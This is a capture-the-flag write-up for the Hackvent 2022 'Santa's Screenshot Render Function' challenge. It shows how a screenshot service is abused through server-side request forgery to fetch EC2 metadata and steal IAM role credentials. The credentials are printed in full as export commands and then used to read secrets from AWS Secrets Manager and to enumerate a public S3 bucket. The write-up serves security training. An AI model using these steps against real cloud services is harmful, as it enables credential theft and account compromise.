# [HV22.11] Santa's Screenshot Render Function

<table>
  <tr>
    <th>Categories</th>
    <td>Web security</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>medium</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>Deaths Pirate</td>
  </tr>
</table>

## Description
Santa has been screenshotting NFTs all year. Now that the price has dropped, he has resorted to screenshotting websites. It's impossible that this may pose a security risk, is it?

You can find Santa's website here: https://hackvent.deathspirate.com


## Solution
This was probably the most controversial challenge of this Hackvent.

The beginning was easy.

The provided website was a service to take screenshots of websites at a given URL.
From the UI, it was pretty clear, the website was running on some AWS service, potentially Elastic Compute Cloud (EC2).

The website's UI loaded an image from an open S3 bucket located at `https://hackvent2022.s3.eu-west-2.amazonaws.com/`.
When navigating to it, it listed the bucket's contents:
```xml
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
<Name>hackvent2022</Name>
<Prefix/>
<Marker/>
<MaxKeys>1000</MaxKeys>
<IsTruncated>false</IsTruncated>
<Contents>
    <Key>3723050.png</Key>
    <LastModified>2022-11-05T17:34:55.000Z</LastModified>
    <ETag>"74b18f977180ce6366f8ef8954409781"</ETag>
    <Size>57382</Size>
    <StorageClass>STANDARD</StorageClass>
</Contents>
<Contents>
    <Key>aws-logo-500x500.webp</Key>
    <LastModified>2022-11-06T02:48:24.000Z</LastModified>
    <ETag>"a8e941e05c0f0419183c8438c1310bc5"</ETag>
    <Size>10936</Size>
    <StorageClass>STANDARD</StorageClass>
</Contents>
<Contents>
    <Key>flag1.txt</Key>
    <LastModified>2022-11-05T17:34:56.000Z</LastModified>
    <ETag>"0011e3e5a6dbde2218af677401f8f9b2"</ETag>
    <Size>306</Size>
    <StorageClass>STANDARD</StorageClass>
</Contents>
</ListBucketResult>
```

The bucket contains a file [flag1.txt](https://hackvent2022.s3.eu-west-2.amazonaws.com/flag1.txt), typing out the first bit of the flag:
```
HV22{H0_h0_h0_H4v3_&_
```

Next, we had to leverage the screenshotting service to gain more information.

["The Pentest book" on AWS cloud enumeration](https://pentestbook.six2dez.com/enumeration/cloud/aws) was helpful there.
AWS EC2 instances can reach out to a meta data URL (also hinted to by the UI) to list data associated with the box. The information can only be called by EC2 instances and not from the outside. 
Perfect for our challenge.

The meta data root URL is at http://169.254.169.254/latest/meta-data/.

"Screenshotting" this URL allowed me to get to the entry located at http://169.254.169.254/latest/meta-data/iam/security-credentials/Hackvent-SecretReader-EC2-Role, which sounds promising for a secret reader role to take over.

Screenshotting this URL allowed me to get a picture of the AWS key ID, the secret key and the token - all needed in order to be able to interact with the AWS API. 
This represented a picture of about 1300 characters to be taken over from the picture somehow.

![AWS secrets in an image](./r0_SecretReaderRole_1119.png)

Gladly, it was a Sunday (although sunny).

I OCR-ed the image and error checked it line by line manually (see other write-ups for more automated approaches).

```sh
export AWS_ACCESS_KEY_ID="ASIA4G76YFUNCD7WTCDZ"
export AWS_SECRET_ACCESS_KEY="J9q91oLNm7YYoHdlf4dbpjHWI5l8+ZoWdeHSl6HD"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEGIaCWV1LXdlc3QtMiJHMEUCIQCLXSwcqP9jRXzbDaqIm4A/Jlh5tEE47ONLRAt/eYPSUgIgLNQqvsmtAL3h11ILDEEwTRIEFW0B08MZ87iR7UrRizQq1gQIi///////////ARAAGgw4Mzk2NjM0OTY0NzQiDJXGI4nJRAHN6kewCyqqBB7fcIbTsFeNNnXV1NvqRejo3rpmwbY4VFtfekHnWRc/8Xd99jAmIa4iqQZqhLYe7ldjzjyc6LHpiCZFsBG/W498U+hJ9OejRtnV64U92BX0QNpktysYzVHwv2SESccvJkDxDx93mWY2zlhnyGJFvAGL4P2adozfJuHrUJUa6rTtZ5CUjhSLnvFUHpkZasShqc2squ4OtmWm8vLnW8lBa2vc0M/rYGPZ74pueVQx0nx9hrN8Qdr+2xS++OsT/1+k0XoR6bYimyoghEG+iHGc3kMF4E3HoK3ngzQoLN4Yw+1YGibE93J/nKqEnsP0KFvsIk5l4ul3fcoNGEA0FmacmBpCzVu3uSJDtx8VVgCx9U18lQ5xXFGN0Q+E7Z8Bpm9lBekSs0iYaOsJ1vCvkUq1OxKImDNk1ZXrodndvXD3FtjBT+JcsbE8salnL9aNL2TJGF4GIWAVKxGIJ0VbA5ZdBZ/r7E1ll6ZSJV3UA85OmqI1DQqxscgPqtRPOEYhKTvYOv06W4XQPIsV1DQRyBjlFY1pFdcPrd81jyYCokSYNOXX220AwILId0s8s3AhhOtQp3nLHLLk6keMo73J8kOeUXTZm/uxz9b0Ab1IHexFKjCsT+oEDgoyGRVbJOi7RAeYwD/QWaWL+gdXVSIUsVBVKWPz0BqwpEcV1lj1bbOAVG6gwnhEIQMnQH4slssIm4F1yGHIE3kqANZrqgvinK7+u0/zG3Ykh8G8uN+MMMHS1pwGOqkB4wUCmog4JVVjMWcCEQif3CaUfMZp4u0Ifs6UdHgCh8ZjWnr/GwGp7KvEuwjmmlC7mLqMGdAGMcg3miqVZ9D3ks8dKGD+BI4sn4CtGNaAKsICobG1PChQUL47Siqk6WZnIONnyj2SMcVcghP9UZTvZVYWEPRw3qyCcWdc1WYyTqREQi+dUoMH1JCaqOyYyszlo8lDZ2cWdLpDsPFXnyFcASFdq5uOqY/+EQ=="
```

Once I managed to connect to the API using the `aws` CLI, I tried to list secrets in Secret Manager (as hinted to by the role name).

```
$ aws secretsmanager list-secrets
{
    "SecretList": []
}
```

I felt like in a bad western film, where you can only hear the crickets in the background...

After enumerating and scanning all possible AWS services using [weirdAAL](https://github.com/carnal0wnage/weirdAAL), I realised that I did query the default region every time.

Let's set the `eu-west-2` region (from the initial S3 URL) explicitly - and, tadaa, here we are:
```
$ aws --region eu-west-2 secretsmanager list-secrets
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:eu-west-2:839663496474:secret:flag2-UjomOM",
            "Name": "flag2",
            "Description": "Flag for hackvent 2022",
            "LastChangedDate": "2022-12-10T22:04:51.135000+01:00",
            "LastAccessedDate": "2022-12-11T01:00:00+01:00",
            "Tags": [],
            "SecretVersionsToStages": {
                "3cb95787-eea6-475b-9b5b-16bac83b449d": [
                    "AWSPREVIOUS"
                ],
                "8a498b78-e73f-4a97-a0c3-74f365d3aa0d": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2022-11-05T18:44:58.369000+01:00"
        }
    ]
}

$ aws --region eu-west-2 secretsmanager get-secret-value --secret-id flag2
{
    "ARN": "arn:aws:secretsmanager:eu-west-2:839663496474:secret:flag2-UjomOM",
    "Name": "flag2",
    "VersionId": "8a498b78-e73f-4a97-a0c3-74f365d3aa0d",
    "SecretString": "{\"flag2description\":\"Oh Hai! Santa made us split the flag up, he gave this part to me and told me to put it somewhere safe, I figured this was the best place.  The other half he gave to another Elf and told him the same thing, but that Elf told me he just threw it into a bucket!  That doesn't sound safe at all!\",\"flag2\":\"M3r2y-Xm45_Yarr222_<3_Pirate}\",\"what_is_this\":\"Oh I forgot to mention I overheard some of the elves talking about making tags available ... maybe they mean gift tags?! Who knows ... maybe you can make something out of that ... or not :D \"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2022-12-10T22:04:51.128000+01:00"
}
```

## Notes
Meta data URL candidates were the following. But the one including the role name looked the most promising:
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/Hackvent-SecretReader-EC2-Role   # temporary; 11:00 token ends in Xxy7Ew== (exp: 15:25)
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance   # seems fix; 11:00 token ends in PYcWI== (exp: 15:26)
http://169.254.169.254/latest/meta-data/auth-identity-credentials/ec2/security-credentials/ec2-instance   # tbd; 11:00 token ends in uehGdM==  (exp: 15:30)
```

## Flag
```
HV22{H0_h0_h0_H4v3_&_M3r2y-Xm45_Yarr222_<3_Pirate}
```

## Hidden Flag 02
Run the "screenshot service" to screenshot this: `http://169.254.169.254/latest/meta-data/tags/instance/hidden_flag`

```
HV22{5G0ldRing5QuickGetThem2MtDoom}
```
